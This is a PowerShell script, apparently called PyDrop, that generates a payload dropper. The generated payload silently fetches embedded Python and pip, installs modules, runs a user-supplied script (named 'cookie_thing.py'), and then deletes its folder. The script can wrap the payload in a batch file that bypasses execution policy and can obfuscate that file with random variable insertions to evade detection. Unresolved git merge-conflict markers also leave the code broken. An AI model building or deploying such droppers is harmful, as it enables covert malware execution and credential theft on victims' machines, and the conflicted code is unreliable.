$code = @"
function embed_python {
    `$python_url = 'https://www.python.org/ftp/python/3.10.9/python-3.10.9-embed-amd64.zip'
    `$python_zip = 'python-3.10.9-embed-amd64.zip'
    `$embed_path = `$env:localappdata + '\python-3.10.9-embed-amd64'
    if (-not (Test-Path `$embed_path)) {
        Start-BitsTransfer -Source `$python_url -Destination `$python_zip -Priority Foreground -TransferType Download
        Expand-Archive `$python_zip -DestinationPath `$embed_path
        Remove-Item `$python_zip
    }
    `$python_code = @'
CODE_HERE
'@
    `$python_code | Out-File `$embed_path\cookie_thing.py -Encoding utf8
    Start-BitsTransfer -Source 'https://bootstrap.pypa.io/get-pip.py' -Destination `$embed_path\get-pip.py -Priority Foreground -TransferType Download
    Start-Process `$embed_path\python.exe -ArgumentList `"-m get-pip`" -NoNewWindow -Wait > `$null
    Add-Content `$embed_path\python310._pth @'
Lib
Lib\site-packages
'@ > `$null
    Start-Process `$embed_path\python.exe -ArgumentList `"-m pip install REQUIRED_MODULES`" -NoNewWindow -Wait > `$null
    Start-Process `$embed_path\python.exe -ArgumentList `$embed_path\cookie_thing.py -NoNewWindow -Wait > `$null
    Remove-Item `$embed_path -Recurse -Force
}
embed_python
"@

function Invoke-obfuscate {
    param(
        [string]$line
    )
    $result = ""
    $variable = $False
    $carrot = $False
    foreach($char in $line -split "") {
        if ($char -eq "%") {
            $variable = -not $variable
        }
        if ($variable) {
            $result += $char
        } elseif ($carrot) {
            $result += $char
            $carrot = $False
        } else {
            if ($char -eq "@") {
                $result += "^@"
            }
            elseif ($char -eq "`"") {
                $result += "^`""
            }
            elseif ($char -eq "|") {
                $result += "^"
                $carrot = $True
            }
            else {
                $ran_string = New-random_string
                $result += "$char%$ran_string%"
            }
        }
    }
    return $result
}

function New-random_string {
    $length = Get-Random -Minimum 5 -Maximum 10
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    $result = ""
    for ($i = 0; $i -lt $length; $i++) {
        $rand = Get-Random -Maximum $chars.Length
        $result += $chars[$rand]
    }
    return $result
}

function Start-PyDrop {
    try {
        Remove-Item ".\Output" -Recurse -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Host "No Output folder found"
    }
    Write-Host "Starting PyDrop..."
    Start-Sleep -s 1
    Write-Host "Where is path to pyfile? -> " -ForegroundColor Green -NoNewline
    $pyfile = Read-Host
    $contents = Get-Content $pyfile
    $contents = $contents -join "`n"
    $code = $code.Replace("CODE_HERE", $contents)
    Write-Host "Where are the required modules path? (Example = requirements.txt) or put nothing if you don't have one. -> " -ForegroundColor Green -NoNewline
    $modules = Read-Host
    if ($modules -eq "") {
        $code = $code.Replace("    Start-Process `$embed_path\python.exe -ArgumentList `"-m pip install REQUIRED_MODULES`" -NoNewWindow -Wait > `$null", "")
    } else {
        $modules = Get-Content $modules
        $modules = $modules -join " "
        $code = $code.Replace("REQUIRED_MODULES", $modules)
    }
    mkdir ".\Output" -ErrorAction SilentlyContinue > $null
    Add-Content ".\Output\payload.ps1" $code
    Write-Host "Would you like the file to be a bat file? the default is ps1. (y/n) -> " -ForegroundColor Green -NoNewline
    $bat = Read-Host
    Write-Host "Would you like to obfuscate the code? (y/n) -> " -ForegroundColor Green -NoNewline
    $obf = Read-Host
    if ($bat -eq "y") {
        Write-Host "Making bat file..."
        Start-Sleep -s 1
        $code2 = $code.Split("`n")
        foreach ($line in $code2) {
            if ($line -eq "") {
                continue
            }
            $line_split = $line.Replace("`n", "")
            $line_split = $line_split.Replace("`r", "")
            $line_split = $line_split.Replace("|", "^|")
            $line_split = $line_split.Replace(">", "^>")
<<<<<<< HEAD
            $line_split = $line_split.Replace("<", "^<")
=======
>>>>>>> 2b9afa7b43171ff8221938e44c9e2d9cf7edda2a
            $line = "echo " + $line_split + " >> payload.ps1"
            Add-Content ".\Output\payload.bat" $line
        }
        $execute = "powershell -ExecutionPolicy Bypass -File payload.ps1"
        Add-Content ".\Output\payload.bat" $execute
        Remove-Item ".\Output\payload.ps1"
    }
    if ($obf -eq "y") {
        if ($bat -eq "y") {
            $bat_code = Get-Content ".\Output\payload.bat"
            foreach ($line in $bat_code) {
                $line = Invoke-obfuscate $line
                Add-Content ".\Output\payload_obf.bat" $line
                Remove-Item ".\Output\payload.bat"
                Remove-Item ".\Output\payload.ps1"
            }
        } else {
            Write-Host "THIS IS NOT DONE YET PLEASE USE INVOKE-OBFUSCATE TO OBFUSCATE YOUR CODE"
            Add-Content ".\Output\payload.ps1" $line
        }
    } else {
        Write-Host "Done!" -ForegroundColor Green
<<<<<<< HEAD
        Read-Host
    }
}

Start-PyDrop
=======
    }
}

Start-PyDrop
>>>>>>> 2b9afa7b43171ff8221938e44c9e2d9cf7edda2a
